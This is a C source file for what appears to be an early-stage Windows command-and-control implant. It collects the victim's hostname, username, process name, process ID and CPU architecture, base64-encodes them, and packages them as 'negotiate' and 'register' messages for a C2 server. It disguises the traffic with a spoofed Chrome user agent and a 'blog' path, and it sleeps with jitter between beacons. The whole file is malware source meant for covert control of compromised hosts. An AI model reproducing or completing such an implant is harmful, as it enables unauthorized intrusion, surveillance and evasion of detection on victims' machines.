#include <windows.h>
#include <tlhelp32.h>
#include "log.h"

struct {
    CHAR* address;
    INT port;
} http;

struct {
    CHAR* path;
    CHAR* user_agent;
} transport;

struct {
    CHAR* cookie;
    CHAR* keyword; 
} auth;

struct {
    CHAR* status;
    CHAR* format;
    CHAR* buffer;
    CHAR length[MAX_PATH];
    DWORD size;
} data;

struct { 
    CHAR hostname[MAX_PATH];
    CHAR username[MAX_PATH];
    DWORD pid;
    CHAR* name;
    CHAR arch[MAX_PATH];
} info;

CHAR* encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
    DWORD encoded_data_length = strlen(data_to_encode) * 2;
    CHAR* encoded_data = (CHAR*)malloc(encoded_data_length);

    log_debug("Attempting to encode data...");
    CryptBinaryToStringA((BYTE*)data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded_data, &encoded_data_length);
    
    log_debug("Encoded data: %s", encoded_data); 
    log_debug("Encoded data length: %d", encoded_data_length);

    return encoded_data;
}

void package(CHAR* buffer) {
    CHAR* carriage_return = "%s\r\n\r\n";
    CHAR* content_length_header = "Content-Length: %lu\r\n"; 
    DWORD dw_error = GetLastError();

    DWORD package_length = strlen(carriage_return) + strlen(buffer);
    CHAR* package = (CHAR*)calloc(package_length, sizeof(CHAR));
    sprintf_s(package, package_length, carriage_return, buffer);

    sprintf_s(data.length, MAX_PATH, content_length_header, package_length);
    data.buffer = package;
    data.size = package_length;

    if (strcmp(data.buffer, "") == 0) {
        log_error("Error: %lu\n", dw_error);
    } 

    if (strcmp(data.length, "") == 0) {
        log_error("Error: %lu\n", dw_error);
    } else {
        log_debug("Header set: %s\n", data.length);
    }
}

void register_device() {
    /**
     * Registration data structure:
     * 
     *      Status          4       (INT)
     *          0: Negotiate
     *          1: Register
     *          2: Beacon
     *          3: Output
     *      Hostname        256     (CHAR*)
     *      Username        256     (CHAR*)
     *      Process name    256     (CHAR*)
     *      Process id      4       (DWORD)
     *      Arch            256     (CHAR*)
     * 
    */

    DWORD default_length = 256;
    DWORD dw_error = GetLastError();

    PROCESSENTRY32 process_info;
    process_info.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    data.status = "register";
    data.format = "%s:%s,%s,%lu,%s,%s";

    if (GetComputerNameA(info.hostname, &default_length)) {
        log_info("Hostname %s", info.hostname);
    } else {
        log_error("Error: %lu", dw_error);
    }
    
    if (GetUserNameA(info.username, &default_length)) {
        log_info("Username: %s", info.username);
    }
    else {
        log_error("Error: %lu", dw_error);
    }

    if (GetCurrentProcessId()) {
        info.pid = GetCurrentProcessId();
        log_info("Process ID: %lu", info.pid);
    }
    else {
        log_error("Error: %lu", dw_error);
    }

    if (Process32First(snapshot, &process_info)) {
        while (Process32Next(snapshot, &process_info)) {
            if (info.pid == process_info.th32ProcessID) {
                info.name = _strdup(process_info.szExeFile);
                log_info("Process Name: %s", info.name);
            }
        }
    }
    else {
        log_error("Error: %lu\n", dw_error);
    }

    if (GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", info.arch, default_length)) {
        log_info("Operating System Arch: %s", info.arch);
    }
    else {
        log_error("Error: %lu\n", dw_error);
    }

    DWORD pointer_length = strlen(data.format) + strlen(data.status) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
    CHAR* data_pointer = malloc(pointer_length);
    sprintf_s(data_pointer, pointer_length, data.format, data.status, info.hostname, info.username, info.pid, info.name, info.arch);

    DWORD data_length = pointer_length - strlen(data.format) + 6;
    CHAR* buffer = encode(data_pointer, data_length);
    package(buffer);

    log_info("Buffer: %s", buffer); 
    
    goto clean_memory;
    clean_memory:
        log_debug("Attempting to clean memory");
        free(data_pointer);
        free(buffer);
        free(info.name);
        CloseHandle(snapshot);
}

void negotiate_key(CHAR* keyword) {
    /**
     * Key negotiation data structure:
     *      Status          4       (INT)
     *          0: Negotiate
     *          1: Register
     *          2: Beacon
     *          3: Output
     *      Keyword         256     (CHAR*)
     * 
    */

    data.status = "negotiate";
    data.format = "%s:%s";

    DWORD pointer_length = strlen(data.format) + strlen(data.status) + strlen(auth.keyword);
    CHAR* data_pointer = malloc(pointer_length);
    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.keyword);

    DWORD data_length = pointer_length - strlen(data.format);
    CHAR* buffer = encode(data_pointer, data_length);
    package(buffer);

    log_info("Buffer: %s", buffer); 

    goto clean_memory;
    clean_memory:
        log_debug("Attempting to clean memory");
        free(data_pointer);
        free(buffer);
}

float calculate_jitter(int seconds, int percent) {
    float jitter = (((seconds * percent / 100) + (rand() % ((seconds + (seconds * percent / 100)) + 1))) * 1000);
    log_info("Sleep time: %.6f", jitter);
    return jitter;
}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        http.address = argv[1];
        http.port = 1337;

    } else if (argc == 3) {
        http.address = argv[1];
        http.port = atoi(argv[2]);
    } else {
        http.address = "127.0.0.1";
        http.port = 1337;
    }

    log_info("Address: %s", http.address);
    log_info("Port: %d", http.port);

    transport.path = "blog";
    transport.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";

    auth.cookie = NULL;
    auth.keyword = "schistosomiasis";

    log_info("Path: %s", transport.path);
    log_info("User Agent: %s", transport.user_agent);
    log_info("Keyword: %s", auth.keyword);
    
    negotiate_key(auth.keyword);
    Sleep(calculate_jitter(3, 30));
    register_device();
    Sleep(calculate_jitter(3, 30));
    register_device();
    Sleep(calculate_jitter(3, 30));
}